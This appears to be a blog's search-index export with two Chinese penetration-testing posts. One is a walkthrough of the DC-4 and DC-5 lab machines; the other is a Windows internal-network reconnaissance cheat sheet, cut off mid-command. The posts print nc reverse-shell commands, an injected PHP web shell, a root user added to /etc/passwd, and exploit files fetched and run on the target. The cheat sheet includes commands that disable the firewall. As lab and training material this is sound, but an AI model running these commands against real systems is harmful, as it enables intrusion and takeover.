<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>DC4 &amp; DC5</title>
      <link href="/2024/01/23/DC4%20&amp;%20DC5/"/>
      <url>/2024/01/23/DC4%20&amp;%20DC5/</url>
      
        <content type="html"><![CDATA[<h2 id="DC-4"><a href="#DC-4" class="headerlink" title="DC-4"></a>DC-4</h2><img src="/2024/01/23/DC4%20&%20DC5/image-20230803162929909.png" alt="image-20230803162929909" style="zoom:50%;"><p>打开环境</p><h3 id="一、信息搜集"><a href="#一、信息搜集" class="headerlink" title="一、信息搜集"></a>一、信息搜集</h3><h4 id="1-主机扫描"><a href="#1-主机扫描" class="headerlink" title="1.主机扫描"></a>1.主机扫描</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp -scan -l</span><br></pre></td></tr></table></figure><img src="/2024/01/23/DC4%20&%20DC5/image-20230803163038767.png" alt="image-20230803163038767" style="zoom:55%;"><p>发现主机IP为：<code>192.168.85.134</code></p><h4 id="2-端口扫描"><a href="#2-端口扫描" class="headerlink" title="2.端口扫描"></a>2.端口扫描</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn -sS -p- 192.168.85.134</span><br></pre></td></tr></table></figure><img src="/2024/01/23/DC4%20&%20DC5/image-20230803163648737.png" alt="image-20230803163648737" style="zoom:55%;"><p>扫出<code>22</code>和<code>80</code>端口</p><h4 id="3-目录扫描"><a href="#3-目录扫描" class="headerlink" title="3.目录扫描"></a>3.目录扫描</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u 192.168.85.134 -e * </span><br></pre></td></tr></table></figure><img src="/2024/01/23/DC4%20&%20DC5/image-20230803164106390.png" alt="image-20230803164106390" style="zoom:50%;"><p>先放着吧</p><h4 id="4-网页信息探测"><a href="#4-网页信息探测" class="headerlink" title="4.网页信息探测"></a>4.网页信息探测</h4><img src="/2024/01/23/DC4%20&%20DC5/image-20230803164456903.png" alt="image-20230803164456903" style="zoom:33%;"><p>进去就是一个登录框，但是没发现什么有用的东西</p><h3 id="二、渗透过程"><a href="#二、渗透过程" class="headerlink" title="二、渗透过程"></a>二、渗透过程</h3><h4 id="1-密码爆破"><a href="#1-密码爆破" class="headerlink" title="1.密码爆破"></a>1.密码爆破</h4><p>因为刚刚有一个登录框，所以我们尝试弱口令爆破</p><p>打开burpsuite，猜密码为admin，用GitHub上的top1000弱口令字典爆破</p><img src="/2024/01/23/DC4%20&%20DC5/image-20230803170031088.png" alt="image-20230803170031088" style="zoom:45%;"><img src="/2024/01/23/DC4%20&%20DC5/image-20230803170954664.png" alt="image-20230803170954664" style="zoom:45%;"><p>爆破了一会儿，发现好多状态码都一样，我以为弄错了，结果发现好多密码都可以，好迷</p><p>直接 admin : 123 登录成功</p><img src="/2024/01/23/DC4%20&%20DC5/image-20230803172328958.png" alt="image-20230803172328958" style="zoom:40%;"><p>进入之后是一个命令执行界面</p><h4 id="2-命令执行"><a href="#2-命令执行" class="headerlink" title="2.命令执行"></a>2.命令执行</h4><p>点commend，抓包，将radio参数改成想执行的命令</p><img src="/2024/01/23/DC4%20&%20DC5/image-20230803173516355.png" alt="image-20230803173516355" style="zoom:40%;"><h4 id="3-反弹shell"><a href="#3-反弹shell" class="headerlink" title="3.反弹shell"></a>3.反弹shell</h4><p>试了一下，不能echo命令写入木马，只好换一种方法进行反弹shell，这里试过了bash反弹不了，只能用nc反弹shell，参考<a href="https://www.freebuf.com/articles/system/178150.html">Linux下几种反弹Shell方法的总结与理解</a></p><p>kali:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 2222</span><br></pre></td></tr></table></figure><p>在burpsite中，将shell弹到kali监听的端口上</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/bash 192.168.85.128 2222</span><br></pre></td></tr></table></figure><img src="/2024/01/23/DC4%20&%20DC5/image-20230803181626008.png" alt="image-20230803181626008" style="zoom:50%;"><p>反弹shell成功，接着升级为交互shell</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="symbol">&#x27;import</span> pty;pty.<span class="title function_ invoke__">spawn</span>(<span class="string">&quot;/bin/bash&quot;</span>)&#x27;</span><br></pre></td></tr></table></figure><img src="/2024/01/23/DC4%20&%20DC5/image-20230803181735725.png" alt="image-20230803181735725" style="zoom:50%;"><h4 id="4-linux提权"><a href="#4-linux提权" class="headerlink" title="4.linux提权"></a>4.linux提权</h4><p>参考<a href="https://blog.csdn.net/sun_luming/article/details/120883716">Linux的home目录</a></p><p>看一下该主机的普通用户，能不能尝试登进去寻找其他突破口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /home</span><br><span class="line"><span class="built_in">ls</span></span><br></pre></td></tr></table></figure><img src="/2024/01/23/DC4%20&%20DC5/image-20230803182809181.png" alt="image-20230803182809181" style="zoom:50%;"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> jim </span><br><span class="line"><span class="built_in">ls</span></span><br></pre></td></tr></table></figure><p>一个一个测，发现只有<strong>jim</strong>能<code>ls</code></p><img src="/2024/01/23/DC4%20&%20DC5/image-20230803183119502.png" alt="image-20230803183119502" style="zoom:50%;"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat mbox</span><br></pre></td></tr></table></figure><img src="/2024/01/23/DC4%20&%20DC5/image-20230811094443275.png" alt="image-20230811094443275" style="zoom:50%;"><p>可以看到permission denied，权限不够，看看其他的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd backups</span><br><span class="line">cat old*</span><br></pre></td></tr></table></figure><img src="/2024/01/23/DC4%20&%20DC5/image-20230803184617016.png" alt="image-20230803184617016" style="zoom:50%;"><p>打开文件发现有一大堆密码在里面，我们将它们复制出来放在一个文件里面</p><img src="/2024/01/23/DC4%20&%20DC5/image-20230810113321021.png" alt="image-20230810113321021" style="zoom:50%;"><p>用超级弱口令工具爆破一下ssh，连接成功</p><img src="/2024/01/23/DC4%20&%20DC5/image-20230810114341896.png" alt="image-20230810114341896" style="zoom:50%;"><p>接着ssh远程登入一下，jim : jibril04</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh jim<span class="variable">@192</span>.<span class="number">168.85</span>.<span class="number">134</span></span><br></pre></td></tr></table></figure><img src="/2024/01/23/DC4%20&%20DC5/image-20230810114535911.png" alt="image-20230810114535911" style="zoom:50%;"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat mbox</span><br></pre></td></tr></table></figure><img src="/2024/01/23/DC4%20&%20DC5/image-20230811094752037.png" alt="image-20230811094752037" style="zoom:50%;"><p>现在就能看到之前看不到的mbox，里面的内容大概就是有一封来自root的信，我们去找一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /var/spool/mail</span><br><span class="line"></span><br><span class="line">/var/spool/mail是通常在Linux系统中用于存储邮件队列和用户的电子邮件收件箱。</span><br></pre></td></tr></table></figure><img src="/2024/01/23/DC4%20&%20DC5/image-20230811095301686.png" alt="image-20230811095301686" style="zoom:50%;"><p>发现里面有一份信，charles休假了，把密码给了jim:sweat_smile:</p><p>换一个用户 charles : ^xHhA&amp;hvim0y</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su charles</span><br></pre></td></tr></table></figure><img src="/2024/01/23/DC4%20&%20DC5/image-20230811101500187.png" alt="image-20230811101500187" style="zoom:50%;"><p>但还不是root用户，跟git提权一样</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><img src="/2024/01/23/DC4%20&%20DC5/image-20230811101607760.png" alt="image-20230811101607760" style="zoom:50%;"><p>发现了个root权限的命令teehee（小型文本编辑器），可以利用这个命令进行提权</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;test::0:0:::/bin/bash&quot; | sudo teehee -a /etc/passwd  </span><br><span class="line">su test</span><br></pre></td></tr></table></figure><img src="/2024/01/23/DC4%20&%20DC5/image-20230811101637789.png" alt="image-20230811101637789" style="zoom:50%;"><blockquote><p>可参考<a href="https://blog.csdn.net/liukaitydn/article/details/83046083">&#x2F;etc&#x2F;passwd文件解刨</a></p><p>简而言之，就是存放用户的文件，可以通过修改该文件达到添加用户的效果，文件格式为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[注册名]:[口令]:[用户标识号]:[组标识号]:[用户名]:[用户主目录]:[命令解析程序]</span><br></pre></td></tr></table></figure><p>口令为x即代表存放有密码，为空即代表没有密码，识标号为0代表root权限</p></blockquote><h4 id="5-查找flag"><a href="#5-查找flag" class="headerlink" title="5.查找flag"></a>5.查找flag</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / -name *flag.*</span><br><span class="line">cat cat /root/flag.txt</span><br></pre></td></tr></table></figure><img src="/2024/01/23/DC4%20&%20DC5/image-20230811101826323.png" alt="image-20230811101826323" style="zoom:50%;"><p>成功:happy::happy::happy:</p><h2 id="DC-5"><a href="#DC-5" class="headerlink" title="DC-5"></a>DC-5</h2><h3 id="一、信息搜集-1"><a href="#一、信息搜集-1" class="headerlink" title="一、信息搜集"></a>一、信息搜集</h3><h4 id="1-主机扫描-1"><a href="#1-主机扫描-1" class="headerlink" title="1.主机扫描"></a>1.主机扫描</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure><img src="/2024/01/23/DC4%20&%20DC5/image-20230811205846616.png" alt="image-20230811205846616" style="zoom:50%;"><h4 id="2-端口扫描-1"><a href="#2-端口扫描-1" class="headerlink" title="2.端口扫描"></a>2.端口扫描</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -p- 192.168.85.135 </span><br></pre></td></tr></table></figure><img src="/2024/01/23/DC4%20&%20DC5/image-20230811210459653.png" alt="image-20230811210459653" style="zoom:50%;"><h4 id="3-目录扫描-1"><a href="#3-目录扫描-1" class="headerlink" title="3. 目录扫描"></a>3. 目录扫描</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u 192.168.85.135</span><br></pre></td></tr></table></figure><img src="/2024/01/23/DC4%20&%20DC5/image-20230811211922945.png" alt="image-20230811211922945" style="zoom:50%;"><p>扫出一下目录，看到说的footer比较可疑</p><h4 id="4-页面信息探测"><a href="#4-页面信息探测" class="headerlink" title="4. 页面信息探测"></a>4. 页面信息探测</h4><p>主页面没发现有啥，只知道用的中间件为<strong>Nginx</strong></p><img src="/2024/01/23/DC4%20&%20DC5/image-20230811212121686.png" alt="image-20230811212121686" style="zoom:33%;"><p>还发现这个年份刷新就会变化，再点到<code>/thankyou.php</code>里面去</p><img src="/2024/01/23/DC4%20&%20DC5/image-20230811214846918.png" alt="image-20230811214846918" style="zoom:33%;"><h3 id="二-渗透过程"><a href="#二-渗透过程" class="headerlink" title="二. 渗透过程"></a>二. 渗透过程</h3><h4 id="1-寻找包含文件的参数"><a href="#1-寻找包含文件的参数" class="headerlink" title="1. 寻找包含文件的参数"></a>1. 寻找包含文件的参数</h4><blockquote><p>刚刚那个页面是随机变化的，出现这种情况，可能是因为传参为空而默认包涵了本地下的<code>footer.php</code>文件，所以考虑到本地文件包含漏洞，当然也可能只是PHP脚本随机的结果</p></blockquote><p>为了验证文件包含的猜想，这里利用burpsuite爆破配合参数fuzz拆解</p><p>fuzz连接，<a href="https://github.com/TheKingOfDuck/fuzzDicts">github字典</a></p><p>用burpsuite爆破</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp; &amp;=/etc/passwd</span><br></pre></td></tr></table></figure><img src="/2024/01/23/DC4%20&%20DC5/image-20230811220305061.png" alt="image-20230811220305061" style="zoom:45%;"><p>爆出file参数</p><img src="/2024/01/23/DC4%20&%20DC5/01/23/DC4%20&%20DC5/image-20230811220433691.png" class title="image-20230811220433691"><h4 id="2-Nginx日志文件包含"><a href="#2-Nginx日志文件包含" class="headerlink" title="2.Nginx日志文件包含"></a>2.Nginx日志文件包含</h4><p>先查看一下Nginx的配置，构造payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ip/thankyou.php?file=/etc/nginx/nginx.conf</span><br></pre></td></tr></table></figure><img src="/2024/01/23/DC4%20&%20DC5/image-20230813161812793.png" alt="image-20230813161812793" style="zoom:50%;"><p>开启了访问日志（access_log）和错误日志（error_log），这里我们看一下错误日志</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.85.135/thankyou.php?file=/var/log/nginx/error.log</span><br></pre></td></tr></table></figure><img src="/2024/01/23/DC4%20&%20DC5/image-20230813163031789.png" alt="image-20230813163031789" style="zoom:40%;"><img src="/2024/01/23/DC4%20&%20DC5/image-20230813163134337.png" alt="image-20230813163134337" style="zoom:45%;"><p>得到了<code>thankyou.php</code>的目录,不难发现，传参错误的时候，会自动记录URL还有referer头在错误日志里，构造payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/thankyou.php?mumua=&lt;?php system($_GET[1])?&gt;</span><br></pre></td></tr></table></figure><p>这里记得用burpsuite发送，用浏览器传参会自动将&lt;&gt;转换成URL编码导致php执行失败</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/thankyou.php?file=/var/log/nginx/error.log&amp;1=whoami</span><br></pre></td></tr></table></figure><img src="/2024/01/23/DC4%20&%20DC5/image-20230813163925578.png" alt="image-20230813163925578" style="zoom: 55%;"><pre><code>#### 3.反弹shell</code></pre><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/thankyou.php?file=/var/log/nginx/error.log&amp;1=nc -e /bin/bash 192.168.185.135 2222</span><br></pre></td></tr></table></figure><img src="/2024/01/23/DC4%20&%20DC5/image-20230813170022371.png" alt="image-20230813170022371" style="zoom: 67%;"><img src="/2024/01/23/DC4%20&%20DC5/image-20230813170048487.png" alt="image-20230813170048487" style="zoom:50%;"><p>反弹shell成功，升级为交互shell</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="symbol">&#x27;import</span> pty; pty.<span class="title function_ invoke__">spawn</span>(<span class="string">&quot;/bin/bash&quot;</span>)&#x27;</span><br></pre></td></tr></table></figure><h4 id="4-Linux提权"><a href="#4-Linux提权" class="headerlink" title="4. Linux提权"></a>4. <a href="https://so.csdn.net/so/search?q=Linux%E6%8F%90%E6%9D%83&spm=1001.2101.3001.7020">Linux提权</a></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -4000 -print 2&gt;/dev/null</span><br></pre></td></tr></table></figure><img src="/2024/01/23/DC4%20&%20DC5/image-20230813172529683.png" alt="image-20230813172529683" style="zoom:50%;"><p>可以看到有两个特殊的命令，<code>/bin/screen-4.5.0</code> <code>/usr/sbin/exim4</code>这里用screen作为突破口，用<strong>searchsploit</strong>工具搜索一下漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit screen 4</span><br></pre></td></tr></table></figure><img src="/2024/01/23/DC4%20&%20DC5/image-20230813173550096.png" alt="image-20230813173550096" style="zoom:50%;"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp  /usr/share/exploitdb/exploits/linux/local/41154.sh /home/bamboo/桌面/exp.sh</span><br></pre></td></tr></table></figure><img src="/2024/01/23/DC4%20&%20DC5/image-20230813173742695.png" alt="image-20230813173742695" style="zoom:50%;"><p>在桌面开启http服务 <strong>注意：这里因为我们的文件是放在桌面的，所以需要在桌面开启！</strong></p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.<span class="built_in">server</span> <span class="number">8888</span></span><br></pre></td></tr></table></figure><img src="/2024/01/23/DC4%20&%20DC5/image-20230813185621932.png" alt="image-20230813185621932" style="zoom:50%;"><p>接下来，我们以文本的形式打开exp.sh文件（因为靶机没有对应的命令，只能手工提取命令了）</p><img src="/2024/01/23/DC4%20&%20DC5/image-20230813174120672.png" alt="image-20230813174120672" style="zoom:50%;"><p>按照提示在桌面新建两个C文件</p><img src="/2024/01/23/DC4%20&%20DC5/image-20230813174611589.png" alt="image-20230813174611589" style="zoom:50%;"><p>保存之后，在桌面打开终端，用gcc编译c文件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c</span><br><span class="line">gcc -o /tmp/rootshell /tmp/rootshell.c</span><br></pre></td></tr></table></figure><img src="/2024/01/23/DC4%20&%20DC5/image-20230813174849851.png" alt="image-20230813174849851" style="zoom:50%;"><p>编译完后，再将这两个c文件删掉，文本让我们用rm命令，我们也可以自己删，接着我们修改<strong>exp.sh</strong>文件内容</p><p>将1到36行的内容全部删除并保存，留下<strong>cd &#x2F;etc</strong>后面的命令</p><img src="/2024/01/23/DC4%20&%20DC5/image-20230813175634970.png" alt="image-20230813175634970" style="zoom:50%;"><p>接着在&#x2F;tmp目录下，下载这三个文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">wget 192.168.85.128:8888/exp.sh</span><br><span class="line">wget 192.168.85.128:8888/libhax.so</span><br><span class="line">wget 192.168.85.128:8888/rootshell</span><br></pre></td></tr></table></figure><img src="/2024/01/23/DC4%20&%20DC5/image-20230813185829290.png" alt="image-20230813185829290" style="zoom:50%;"><p>文件下载完后，赋予exp文件权限并执行exp.sh</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> 777 exp.sh</span><br><span class="line">./exp.sh</span><br></pre></td></tr></table></figure><img src="/2024/01/23/DC4%20&%20DC5/image-20230813201103440.png" alt="image-20230813201103440" style="zoom:50%;"><p>打到这儿按理说就应该提权成功了，但是遇到报错，搜了一下，是安装的 GNU C 库（glibc）版本过低而导致，还没解决:sob:</p><img src="/2024/01/23/DC4%20&%20DC5/image-20230813210917896.png" alt="image-20230813210917896" style="zoom:50%;"><p>之后又尝试了一下在靶机反弹的shell中编译，但是gcc仍然报错</p><img src="/2024/01/23/DC4%20&%20DC5/image-20230813212114247.png" alt="image-20230813212114247" style="zoom:50%;"><p>应该是下载的靶机的问题</p>]]></content>
      
      
      <categories>
          
          <category> 渗透打靶 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>内网信息搜集</title>
      <link href="/2024/01/23/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"/>
      <url>/2024/01/23/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<h1 id="内网信息搜集"><a href="#内网信息搜集" class="headerlink" title="内网信息搜集"></a>内网信息搜集</h1><h2 id="判断当前环境"><a href="#判断当前环境" class="headerlink" title="判断当前环境"></a>判断当前环境</h2><ul><li><p>查看当前网卡和IP信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all</span><br></pre></td></tr></table></figure></li><li><p>查看操作系统详细信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br></pre></td></tr></table></figure></li><li><p>查看当前登录域及域用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net config workstation</span><br></pre></td></tr></table></figure></li><li><p>查看域内时间</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net time /domain</span><br></pre></td></tr></table></figure></li></ul><h2 id="本机信息搜集"><a href="#本机信息搜集" class="headerlink" title="本机信息搜集"></a>本机信息搜集</h2><ul><li><p>获取网卡配置信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all</span><br></pre></td></tr></table></figure></li><li><p>查询操作系统和版本信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systeminfo | findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot; ——英文系统</span><br><span class="line">systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;    ——中文系统</span><br></pre></td></tr></table></figure></li><li><p>查看安装的软件及版本、路径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic product get name,version</span><br></pre></td></tr></table></figure></li><li><p>通过执行powershell命令来获取安装软件的版本以及路径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell &quot;Get-WmiObject -class Win32_Product |Select-Object -Property name,version&quot;</span><br></pre></td></tr></table></figure></li><li><p>查询本机服务信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic service list brief</span><br></pre></td></tr></table></figure></li><li><p>查看当前进程列表和软件进程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist</span><br></pre></td></tr></table></figure></li><li><p>通过wmic命令进行查询</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic process list brief</span><br></pre></td></tr></table></figure></li><li><p>查看当前进程列表对应的用户身份</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist /v</span><br></pre></td></tr></table></figure></li><li><p>查看当前进程是否有杀毒软件（AV）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist /svc</span><br></pre></td></tr></table></figure></li><li><p>查看启动程序信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic startup get command,caption</span><br></pre></td></tr></table></figure></li><li><p>查看计划任务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /query /fo LIST /v</span><br></pre></td></tr></table></figure></li><li><p>查看主机开机时间</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net statistics workstation</span><br></pre></td></tr></table></figure></li><li><p>查询本机用户列表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user</span><br></pre></td></tr></table></figure></li><li><p>查看本机管理员</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup administrators</span><br></pre></td></tr></table></figure></li><li><p>查看当前在线用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query user || qwinsta</span><br></pre></td></tr></table></figure></li><li><p>查询会话情况</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net session</span><br><span class="line"></span><br><span class="line">net use \\10.10.10.13\ipc$ &quot;Admin12345&quot; /user:C1ay\administrator</span><br></pre></td></tr></table></figure></li><li><p>查看本机端口开放情况</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano</span><br></pre></td></tr></table></figure></li><li><p>查询补丁信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br><span class="line"></span><br><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn</span><br></pre></td></tr></table></figure></li></ul><ul><li><p>查询路由表及ARP缓存表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">route print</span><br><span class="line"></span><br><span class="line">arp -a</span><br></pre></td></tr></table></figure></li></ul><ul><li><p>查询本机共享</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net share </span><br><span class="line"></span><br><span class="line">wmic share get name,path,status</span><br></pre></td></tr></table></figure></li><li><p>查询当前权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whomi</span><br></pre></td></tr></table></figure></li><li><p>查看防火墙配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall show config</span><br></pre></td></tr></table></figure></li><li><p>修改防火墙配置信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">win 2003及之前的版本，运⾏指定程序全部连接：</span><br><span class="line">netsh firewall add allowedprogram c:\nc.exe &quot;allow nc&quot; enable</span><br><span class="line"></span><br><span class="line">win 2003之后的版本用这条：</span><br><span class="line">netsh advfirewall firewall add rule name=&quot;pass nc&quot; dir=in action=allow</span><br><span class="line">program=&quot;C:\nc.exe&quot;</span><br><span class="line"></span><br><span class="line">允许指定程序连出，命令如下</span><br><span class="line">netsh advfirewall firewall add rule name=&quot;Allow nc&quot; dir=out action=allow program=&quot;C:</span><br><span class="line">\nc.exe&quot;</span><br><span class="line"></span><br><span class="line">允许 3389 端口放⾏，命令如下</span><br><span class="line">netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in</span><br><span class="line">localport=3389 action=allow</span><br><span class="line"></span><br><span class="line">自定义防⽕墙日志储存位置</span><br><span class="line">netsh advfirewall set currentprofile logging filename &quot;C:\windows\temp\fw.log&quot;</span><br></pre></td></tr></table></figure></li><li><p>关闭防火墙</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">win 2003及之前的版本⽤这条命令：</span><br><span class="line">netsh firewall set opmode disable</span><br><span class="line">win 2003之后的版本⽤这条命令：</span><br><span class="line">netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure></li><li><p>查看远程连接端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Reg query &quot;hkey_local_machine\system\currentcontrolset\control\terminal server\winstations\RDP-Tcp” /v portnumber</span><br></pre></td></tr></table></figure></li><li><p>开启远程连接服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 